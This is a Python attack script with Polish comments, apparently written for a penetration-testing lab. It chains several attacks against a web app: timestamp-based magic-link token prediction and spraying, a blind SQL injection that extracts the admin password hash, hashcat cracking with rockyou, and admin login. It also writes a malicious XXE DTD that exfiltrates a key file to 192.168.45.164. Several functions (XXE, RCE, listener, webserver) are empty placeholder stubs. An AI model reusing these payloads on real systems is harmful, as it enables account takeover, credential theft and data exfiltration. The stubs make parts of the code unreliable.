#!/usr/bin/python3
import base64
import sys
import xml.etree.ElementTree as ET
import vobject
import requests
import argparse
import os
import subprocess
from bs4 import BeautifulSoup
import re
from multiprocessing import Pool

s = requests.session()
target = "http://answers"
proxies = {
    "http": "http://127.0.0.1:8080"
}

def execute_bash_command(command):
    try:
        result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return result.stdout.decode('utf-8')
    except subprocess.CalledProcessError as e:
        print(f"Command '{command}' returned non-zero exit status {e.returncode}.")
        print(f"Error output:\n{e.stderr.decode('utf-8')}")
        return None

def getEpochTime():
    command = "date +%s%3N && curl -s -i -X 'POST' 'http://answers/generateMagicLink' -d 'username=Carl'  && date +%s%3N"
    output = execute_bash_command(command)
    lines = output.split("\n")

    # Pobieramy wartości start i stop time
    start_time = lines[0].strip()
    stop_time = lines[-2].strip()  # ostatnia linia, bez pustego pola na końcu

    # Wyświetlamy wartości
    print(f"[+] Start time: {start_time}")
    print(f"[+] Stop time: {stop_time}")

    # Parsujemy do int (long w kontekście Java)
    start_time = int(start_time)
    stop_time = int(stop_time)

    # Zwracamy wartości jako krotka
    return start_time, stop_time

def createTokenFile():
    file_name = "tokens.txt"
    try:
        with open(file_name, 'w') as file:
            pass  # Nie robimy żadnego zapisu, co spowoduje utworzenie pustego pliku
        print(f"[+] Pusty plik '{file_name}' został pomyślnie utworzony.")
    except IOError:
        print(f"[-] Wystąpił błąd podczas tworzenia pustego pliku '{file_name}'.")

def generateTokens(startTime, stopTime):
    # Wywołanie funkcji
    command = f"java TokenGenerator 5 {startTime} {stopTime} > tokens.txt"
    try:
        # Uruchomienie polecenia, wyciszenie stdout i stderr
        result = subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
        print("[+] Generated token list.")
    except subprocess.CalledProcessError as e:
        print(f"[-] Błąd podczas wykonywania komendy Java: {e}")

def checkToken():
    s.cookies.clear()

    print("Starting token spray. Standby.")
    with open("tokens.txt", "r") as f:
        for word in f:
            print(f"\r[+] Current token: {word.strip()}", end="")
            token = word.rstrip()
            target = f"http://answers/magicLink/{token}"
            sys.stdout.flush()
            r = s.get(url=target, proxies=proxies)
            res = r.headers
            #print(res)

            if s.cookies:
                print(f"Cookie was set with token: {word.strip()}")
                break
        else:
            print("\nNo successful reset with any token.")

def exfiltratePasswordHash():
    # Ustaw wszystkie wartości na false
    data = {
        'active': 'false',
        'mod': 'false'
    }
    response = s.post(target + "/moderate/2", data=data, proxies=proxies)
    print("Initial mod value:", checkSetValue())

    password = ''
    for position in range(1, 29):  # Zakładając, że hasło ma maksymalnie 28 znaków
        found_char = False
        for char_code in range(32, 127):  # Zakres ASCII (od spacji do ~)
            # Wyświetlanie informacji o teście
            sys.stdout.write(f"\rTesting position {position}, character '{chr(char_code)}'...")
            sys.stdout.flush()
            
            data = {
                'active': 'false',
                'mod': f"case when (select substring(password,{position},1) from users where id=1)=chr({char_code}) then true else false end"
            }
            response = s.post(target + "/moderate/2", data=data, proxies=proxies)
            
            # Sprawdzamy, czy wartość 'mod' została zmieniona na 'true'
            mod_value = checkSetValue()
            
            if mod_value == 'true':
                # Wyświetlanie znalezionego znaku
                sys.stdout.write(f"\rChar found at position {position}: '{chr(char_code)}'   ")
                sys.stdout.flush()
                password += chr(char_code)
                found_char = True
                break
        
        if not found_char:
            print("\nNo more characters found or end of password.")
            break

        # Wyświetl aktualne hasło
        sys.stdout.write(f"\rExfiltrated password so far: {password}    ")
        sys.stdout.flush()
    
    print(f"\nFinal exfiltrated password hash: {password}")
    return password

def base64_to_hex(base64_hash):
    decoded_bytes = base64.b64decode(base64_hash)
    return decoded_bytes.hex()

def run_hashcat_from_file(hash_file, word_list_file, output_file):

    # Define hashcat command
    hashcat_command = (
        f"hashcat -m 100 -a 0 -w 3 --potfile-disable --remove --outfile {output_file} {hash_file} {word_list_file}"
    )

    # Execute hashcat command using subprocess
    try:
        print(f"Running command: {hashcat_command}")
        output = subprocess.run(hashcat_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return output
    except subprocess.CalledProcessError as e:
        error_message = e.output.decode("utf-8")
        raise RuntimeError(f"Error executing hashcat command: {error_message}")

def read_cracked_password(output_file):

    if not os.path.exists(output_file):
        print("Output file does not exist.")
        return ""

    with open(output_file, 'r') as f:
        line = f.readline().strip()
        if ':' in line:
            hash_hex, password = line.split(':', 1)
            return password

    return ""

def checkSetValue():
    response = s.get(target+"/moderate", proxies=proxies)
    # Sprawdzenie statusu odpowiedzi
    if response.status_code != 200:
        raise Exception(f"GET request failed with status code {response.status_code}")

    # Parsowanie zawartości odpowiedzi
    soup = BeautifulSoup(response.content, 'html.parser')
    # Znalezienie formularza z akcją "/moderate/2"
    form = soup.find('form', {'action': '/moderate/2'})

    if not form:
        raise Exception("Formularz '/moderate/2' nie został znaleziony.")

    # Znalezienie elementu select z nazwą "mod"
    mod_select = form.find('select', {'name': 'mod'})

    if not mod_select:
        raise Exception("Element select z nazwą 'mod' nie został znaleziony.")

    # Znalezienie wybranej opcji
    selected_option = mod_select.find('option', selected=True)

    if not selected_option:
        raise Exception("Wybrana opcja dla 'mod' nie została znaleziona.")
    # Pobranie wartości wybranej opcji
    mod_value = selected_option['value']

    return mod_value 

def authenticate(username, password):
    s.cookies.clear()
    data = {
        'username': f'{username}',
        'password': f'{password}',
        'submit': 'Submit'
    }
    response = s.post(target + "/login", data=data, proxies=proxies)
    if s.cookies:
        print(f"[+] Authentication successsful")
    else:
        print("\n[-] No successful authentication.")
    return response.headers

def XXE():
    target = target + "/admin"
    thistuple = (1, 3, 7, 8, 7, 5, 4, 6, 8, 5)
    x = thistuple.count(5)
    print(x)

def RCE():
    thistuple = (1, 3, 7, 8, 7, 5, 4, 6, 8, 5)
    x = thistuple.count(5)
    print(x)

def runListener():
    thistuple = (1, 3, 7, 8, 7, 5, 4, 6, 8, 5)
    x = thistuple.count(5)
    print(x)

def runWebserver():
    thistuple = (1, 3, 7, 8, 7, 5, 4, 6, 8, 5)
    x = thistuple.count(5)
    print(x)

def createDTDFile():
    dtd = '''
            <!ENTITY % file SYSTEM "file:///home/student/adminkey.txt">
            <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://192.168.45.164/?x=%file;'>">
            %eval;
            %exfiltrate;
            '''
    if dtd:
        # Zapisz wartość parametru `user` do pliku
        with open('malicious.dtd', 'a') as file:
            file.write(dtd)
        return f'DTD: {dtd} zapisano do pliku'
    else:
        return 'No dtd provided', 400

# Uruchomienie funkcji w odpowiedniej kolejności
createTokenFile()
startTime, stopTime = getEpochTime()
generateTokens(startTime, stopTime)
checkToken()

base64_hashes = "oxloQ7JK1hmHw9FF8tai1n5TolY="
hashes_hex = "\n".join(base64_to_hex(hash) for hash in base64_hashes.splitlines())
hash_file = "hashes.txt"

with open(hash_file, "w") as f:
    f.write(hashes_hex)

word_list_file = "/usr/share/wordlists/rockyou.txt"
output_file = "output"

try:
    result = run_hashcat_from_file(hash_file, word_list_file, output_file)
    print("Hashcat output:")
    print(result)
except Exception as e:
    print(f"An error occurred: {e}")
finally:
    if os.path.exists(hash_file):
        os.remove(hash_file)

password = read_cracked_password(output_file)
print("[+] Cracked Password: " + password)
authenticate("admin", password)

#crack_sha1_hash("oxloQ7JK1hmHw9FF8tai1n5TolY=", "/usr/share/wordlists/rockyou.txt")

